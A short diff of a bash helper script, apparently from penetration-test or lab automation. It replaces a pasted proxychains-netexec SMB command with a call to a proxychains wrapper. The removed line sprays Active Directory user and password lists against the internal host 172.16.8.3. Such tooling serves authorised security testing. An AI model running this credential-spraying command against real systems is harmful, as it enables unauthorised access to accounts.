@@ -1,5 +1,6 @@
 #!/bin/bash
 
 source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
+source ~/Desktop/base/code/xdotool/helpers/run_with_proxychains.sh
 
-paste_command "proxychains netexec smb 172.16.8.3 -u documentation/evidence/notes/ad_users.txt -p documentation/evidence/notes/ad_passwords.txt --continue-on-success"
+run_with_proxychains $0
